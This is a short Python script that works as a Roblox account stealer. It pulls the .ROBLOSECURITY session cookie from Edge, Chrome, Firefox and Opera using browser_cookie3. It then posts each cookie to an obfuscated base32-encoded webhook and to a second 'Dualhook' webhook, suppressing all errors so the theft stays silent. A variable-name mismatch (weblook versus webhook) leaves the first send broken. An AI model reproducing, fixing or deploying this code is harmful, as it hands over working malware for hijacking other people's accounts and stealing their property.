import browser_cookie3, requests, threading
import base64
import time
import os





key = "ENCODED BASE32 HOOK HEREEEE"
key2 = "Dualhook webhook"
weblook = base64.b32decode(key)

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except Exception:
        pass

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except Exception:
        pass

def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except Exception:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except Exception:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()
